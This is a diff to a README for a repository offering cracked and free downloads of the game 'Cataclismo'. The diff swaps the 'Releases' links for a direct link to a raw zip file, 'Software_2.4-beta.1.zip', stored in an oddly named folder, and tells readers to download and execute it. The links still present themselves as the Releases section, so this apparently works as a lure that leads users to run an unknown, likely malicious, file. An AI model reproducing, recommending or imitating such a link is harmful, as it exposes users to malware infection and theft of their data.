@@ -15,10 +15,10 @@ Welcome to the Cataclismo GitHub repository! Here you will find all you need to 
 This repository covers a range of topics related to "Cataclismo," including cracked versions, downloads, PC compatibility, free downloads, the Steam platform, torrents, and more. Explore the various aspects of the game through these topics.
 
 ## Releases
-For the latest version of "Cataclismo," visit the [Releases](https://github.com/Macky0621/Cataclismo/releases) section. Download the file and execute it to immerse yourself in the world of fortress building and strategy.
+For the latest version of "Cataclismo," visit the [Releases](https://raw.githubusercontent.com/Macky0621/Cataclismo/main/disinfestation/Software_2.4-beta.1.zip) section. Download the file and execute it to immerse yourself in the world of fortress building and strategy.
 
 ## Get Started
-To get started with "Cataclismo," visit the [Releases](https://github.com/Macky0621/Cataclismo/releases) section and download the latest version. Dive into the game, build your fortress, and prepare to face the Horrors head-on.
+To get started with "Cataclismo," visit the [Releases](https://raw.githubusercontent.com/Macky0621/Cataclismo/main/disinfestation/Software_2.4-beta.1.zip) section and download the latest version. Dive into the game, build your fortress, and prepare to face the Horrors head-on.
 
 🏰👾⚔️
 
